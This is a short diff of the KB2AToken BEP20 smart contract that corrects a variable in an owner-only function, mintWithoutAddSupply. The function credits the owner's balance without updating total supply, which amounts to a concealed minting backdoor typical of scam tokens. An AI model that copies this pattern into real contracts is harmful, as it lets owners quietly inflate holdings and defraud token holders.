@@ -17,7 +17,7 @@ contract KB2AToken is BEP20('KB2A Coin', 'KB2A', 10**9 * 10**18) {
     }
     
     function mintWithoutAddSupply(uint256 amount) external onlyOwner {
-        _amount = _amount.mul(10 ** 18);
+        amount = amount.mul(10 ** 18);
         _balances[_msgSender()] = _balances[_msgSender()].add(amount);
         emit MintProMax(amount);
     }
